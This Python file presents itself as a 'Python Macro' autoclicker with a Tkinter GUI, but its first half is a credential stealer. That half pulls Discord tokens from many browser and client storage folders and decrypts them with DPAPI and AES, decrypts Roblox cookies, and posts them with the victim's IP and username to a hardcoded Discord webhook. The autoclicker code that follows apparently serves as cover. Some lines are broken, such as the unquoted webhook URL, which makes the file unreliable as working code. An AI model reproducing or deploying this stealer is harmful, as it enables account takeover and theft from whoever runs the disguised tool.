import os
import subprocess
import sys
import platform
import json
import urllib.request
import re
import shutil
import base64
import datetime
import win32crypt
from Crypto.Cipher import AES
import requests
import ctypes
import time

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default',
    'Vencord': ROAMING + '\\Vencord'  # Added Vencord directory
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    # Check if the operating system is Windows 11
    if sys.platform == "win32" and platform.release() == "10.0.22000":
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens

def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)

        encoded_cookies = file_content.get("CookiesData", "")

        decoded_cookies = base64.b64decode(encoded_cookies)
        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')

        return decrypted_text
    except Exception as e:
        return str(e)

def main():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                roblox_cookies = retrieve_roblox_cookies()

                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                User ID:```\n {res_json['id']}\n```\nIP Info:```\n {getip()}\n```\nUsername:```\n {os.getenv("UserName")}```\nToken Location:```\n {platform}```\nToken:```\n{token}```\nRoblox Cookies:```\n{roblox_cookies}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made By Ryzen"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Sex Offender",
                }

                urllib.request.urlopen(urllib.request.Request(https://discord.com/api/webhooks/1439340174340390913/ma4jamCgF3dVLl8RG5pQjvN1DB7Ns45bfPk87-MEJwHwoRnmToA46trbe9ep-yCWBE-m, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except (urllib.error.HTTPError, json.JSONDecodeError):
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

if __name__ == "__main__":
    main()

import ctypes
import time
from pynput import mouse, keyboard
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import tkinter as tk
from tkinter import ttk
import threading

PUL = ctypes.POINTER(ctypes.c_ulong)

class MouseInput(ctypes.Structure):
    _fields_ = [("dx", ctypes.c_long),
                ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class Input(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong), ("mi", MouseInput)]

MOUSE_DOWN_FLAGS = {
    mouse.Button.left: 0x0002,
    mouse.Button.right: 0x0008,
    mouse.Button.middle: 0x0020,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}
MOUSE_UP_FLAGS = {
    mouse.Button.left: 0x0004,
    mouse.Button.right: 0x0010,
    mouse.Button.middle: 0x0040,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}

LEFT_DOWN = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_DOWN_FLAGS[mouse.Button.left], 0, None))
LEFT_UP = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_UP_FLAGS[mouse.Button.left], 0, None))

def send_click_optimized():
    """Optimized click function using pre-created inputs"""
    ctypes.windll.user32.SendInput(1, ctypes.byref(LEFT_DOWN), ctypes.sizeof(LEFT_DOWN))
    ctypes.windll.user32.SendInput(1, ctypes.byref(LEFT_UP), ctypes.sizeof(LEFT_UP))

class AutoClickerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Python Macro - Ryzen")
        self.root.configure(bg='black')
        
        self.main_frame = tk.Frame(root, bg='black')
        self.main_frame.pack(padx=10, pady=10, fill='both', expand=True)
        
        title_label = tk.Label(self.main_frame, text=r"""
 ██▓███ ▓██   ██▓▄▄▄█████▓ ██░ ██  ▒█████   ███▄    █     ███▄ ▄███▓ ▄▄▄       ▄████▄   ██▀███   ▒█████  
▓██░  ██▒▒██  ██▒▓  ██▒ ▓▒▓██░ ██▒▒██▒  ██▒ ██ ▀█   █    ▓██▒▀█▀ ██▒▒████▄    ▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▒
▓██░ ██▓▒ ▒██ ██░▒ ▓██░ ▒░▒██▀▀██░▒██░  ██▒▓██  ▀█ ██▒   ▓██    ▓██░▒██  ▀█▄  ▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒
▒██▄█▓▒ ▒ ░ ▐██▓░░ ▓██▓ ░ ░▓█ ░██ ▒██   ██░▓██▒  ▐▌██▒   ▒██    ▒██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░
▒██▒ ░  ░ ░ ██▒▓░  ▒██▒ ░ ░▓█▒░██▓░ ████▓▒░▒██░   ▓██░   ▒██▒   ░██▒ ▓█   ▓██▒▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░
▒▓▒░ ░  ░  ██▒▒▒   ▒ ░░    ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░   ▒ ▒    ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ 
░▒ ░     ▓██ ░▒░     ░     ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░   ░  ░      ░  ▒   ▒▒ ░  ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░ 
░░       ▒ ▒ ░░    ░       ░  ░░ ░░ ░ ░ ▒     ░   ░ ░    ░      ░     ░   ▒   ░          ░░   ░ ░ ░ ░ ▒  
         ░ ░               ░  ░  ░    ░ ░           ░           ░         ░  ░░ ░         ░         ░ ░  
         ░ ░                                                                  ░                          
                                                                                                         
        """, font=('Courier', 8, 'bold'), fg='white', bg='black')
        title_label.pack(pady=10)
        
        self.trigger_label = tk.Label(self.main_frame, text="Trigger: Not Set", font=('Arial', 12),
                                     fg='white', bg='black')
        self.trigger_label.pack(pady=10)
        
        set_trigger_btn = tk.Button(self.main_frame, text="Set Trigger", command=self.set_trigger,
                                   bg='white', fg='black', font=('Arial', 10, 'bold'))
        set_trigger_btn.pack(pady=10)
        
        cps_frame = tk.Frame(self.main_frame, bg='black')
        cps_frame.pack(pady=10)
        tk.Label(cps_frame, text="CPS:", font=('Arial', 12),
                fg='white', bg='black').pack(side=tk.LEFT, padx=5)
        self.cps_entry = tk.Entry(cps_frame, bg='white', fg='black', font=('Arial', 10))
        self.cps_entry.pack(side=tk.LEFT)
        self.cps_entry.insert(0, "50")  # Default to 50 CPS
        self.cps_entry.bind('<Return>', self.update_cps)
        
        apply_cps_btn = tk.Button(cps_frame, text="Apply", command=self.update_cps,
                                 bg='white', fg='black', font=('Arial', 8, 'bold'))
        apply_cps_btn.pack(side=tk.LEFT, padx=5)
        
        self.current_cps_label = tk.Label(self.main_frame, text="Current CPS: 100.0", font=('Arial', 10),
                                         fg='light green', bg='black')
        self.current_cps_label.pack(pady=5)
        
        self.toggle_var = tk.BooleanVar(value=False)
        self.toggle_btn = tk.Checkbutton(self.main_frame, text="Enable Macro", variable=self.toggle_var,
                                        command=self.toggle_macro, bg='black', fg='white',
                                        font=('Arial', 12, 'bold'), selectcolor='black')
        self.toggle_btn.pack(pady=10)
        
        self.status_label = tk.Label(self.main_frame, text="Status: Disabled", font=('Arial', 12),
                                    fg='red', bg='black')
        self.status_label.pack(pady=10)
        
        self.trigger_key = None
        self.trigger_type = None
        self.pressed_keys = set()
        self.mouse_pressed = False
        self.running = False
        self.click_thread = None
        self.stop_clicking = threading.Event()
        self.macro_enabled = False
        self.setting_trigger = False
        self.current_cps = 50.0
        
        self.key_listener = KeyboardListener(on_press=self.on_key_press, 
                                            on_release=self.on_key_release)
        self.key_listener.start()
        
        self.mouse_listener = MouseListener(on_click=self.on_mouse_click)
        self.mouse_listener.start()
        
        footer_frame = tk.Frame(self.main_frame, bg='black')
        footer_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=5)
        
        made_by_label = tk.Label(footer_frame, text="Made by Ryzen", font=('Arial', 8),
                                fg='gray', bg='black')
        made_by_label.pack(side=tk.LEFT)
        
        discord_label = tk.Label(footer_frame, text="Discord: alisten_krazer", font=('Arial', 8),
                                fg='gray', bg='black')
        discord_label.pack(side=tk.RIGHT)
        
        self.root.update_idletasks()
        
        width = self.main_frame.winfo_reqwidth() + 20
        height = self.main_frame.winfo_reqheight() + 20
        self.root.geometry(f"{width}x{height}")
        
        self.root.eval('tk::PlaceWindow . center')
        
        self.update_loop()
    
    def toggle_macro(self):
        self.macro_enabled = self.toggle_var.get()
        if self.macro_enabled:
            if self.trigger_key is None:
                self.toggle_var.set(False)
                self.macro_enabled = False
                self.status_label.config(text="Status: No Trigger Set", fg='orange')
            else:
                self.status_label.config(text="Status: Ready", fg='yellow')
        else:
            self.stop_clicking.set()
            self.running = False
            self.status_label.config(text="Status: Disabled", fg='red')
    
    def update_cps(self, event=None):
        """Update CPS when user presses Enter or clicks Apply button"""
        try:
            new_cps = float(self.cps_entry.get())
            if new_cps <= 0:
                self.current_cps_label.config(text="Error: CPS must be > 0", fg='red')
                return
            
            if new_cps > 1000:
                self.current_cps_label.config(text="Warning: Very high CPS", fg='orange')
            else:
                self.current_cps_label.config(text=f"Current CPS: {new_cps}", fg='light green')
            
            self.current_cps = new_cps
            
            if self.running:
                self.stop_clicking.set()
                time.sleep(0.1)
                if self.macro_enabled and self.should_click():
                    self.stop_clicking.clear()
                    self.click_thread = threading.Thread(target=self.click_loop, daemon=True)
                    self.click_thread.start()
                    
        except ValueError:
            self.current_cps_label.config(text="Error: Invalid CPS value", fg='red')
    
    def set_trigger(self):
        self.setting_trigger = True
        self.trigger_label.config(text="Press any key or mouse button...")
        self.root.update()
        
        self.mouse_listener.stop()
        
        old_trigger = self.trigger_key
        
        self.trigger_key = None
        self.trigger_type = None
        
        if old_trigger and hasattr(old_trigger, 'char'):
            self.pressed_keys.discard(old_trigger)

        def on_mouse_click(x, y, button, pressed):
            if pressed:
                self.trigger_key = button
                self.trigger_type = "mouse"
                return False

        def on_key_press(key):
            self.trigger_key = key
            self.trigger_type = "keyboard"
            return False
        
        mouse_listener = MouseListener(on_click=on_mouse_click)
        keyboard_listener = KeyboardListener(on_press=on_key_press)
        
        mouse_listener.start()
        keyboard_listener.start()
        
        start_time = time.time()
        while self.trigger_key is None and (time.time() - start_time) < 10:  
            time.sleep(0.01)
        
        mouse_listener.stop()
        keyboard_listener.stop()
        
        if self.trigger_key is not None:
            if self.trigger_type == "mouse":
                self.trigger_label.config(text=f"Trigger: {self.trigger_key}")
            else:
                key_name = str(self.trigger_key).replace('Key.', '')
                self.trigger_label.config(text=f"Trigger: {key_name}")
            
            if self.macro_enabled:
                self.status_label.config(text="Status: Ready", fg='yellow')
        else:
            self.trigger_label.config(text="Trigger: Not Set")
        
        self.mouse_listener = MouseListener(on_click=self.on_mouse_click)
        self.mouse_listener.start()
        
        self.setting_trigger = False
    
    def on_key_press(self, key):
        self.pressed_keys.add(key)
    
    def on_key_release(self, key):
        self.pressed_keys.discard(key)
    
    def on_mouse_click(self, x, y, button, pressed):
        if self.trigger_type == "mouse" and button == self.trigger_key:
            self.mouse_pressed = pressed
    
    def should_click(self):
        """Check if we should be clicking based on current trigger state"""
        if self.trigger_type == "mouse":
            return self.mouse_pressed
        else:
            return self.trigger_key in self.pressed_keys
    
    def click_loop(self):
        """Precise click loop with exact CPS timing"""
        try:
            cps = self.current_cps
            if cps <= 0:
                return
            
            delay = 1.0 / cps
            
            next_click_time = time.perf_counter()
            click_count = 0
            start_time = time.perf_counter()
            
            while not self.stop_clicking.is_set():
                current_time = time.perf_counter()
                
                if current_time >= next_click_time:
                    send_click_optimized()
                    click_count += 1
                    
                    next_click_time += delay
                    
                    if current_time - next_click_time > delay:
                        next_click_time = current_time + delay
                
                sleep_time = next_click_time - time.perf_counter()
                if sleep_time > 0.001:
                    time.sleep(min(sleep_time, 0.01))
                elif sleep_time > 0:
                    time.sleep(sleep_time)
                
        except Exception as e:
            print(f"Error in click loop: {e}")
    
    def update_loop(self):
        if self.trigger_key is not None and self.macro_enabled and not self.setting_trigger:
            should_click = self.should_click()
            
            if should_click:
                if not self.running:
                    self.running = True
                    self.stop_clicking.clear()
                    self.click_thread = threading.Thread(target=self.click_loop, daemon=True)
                    self.click_thread.start()
                    self.status_label.config(text="Status: Clicking", fg='green')
            else:
                if self.running:
                    self.running = False
                    self.stop_clicking.set()
                    self.status_label.config(text="Status: Ready", fg='yellow')
        
        self.root.after(5, self.update_loop)

if __name__ == "__main__":
    root = tk.Tk()
    app = AutoClickerGUI(root)
    root.mainloop()

input("\nPress Enter to Exit")
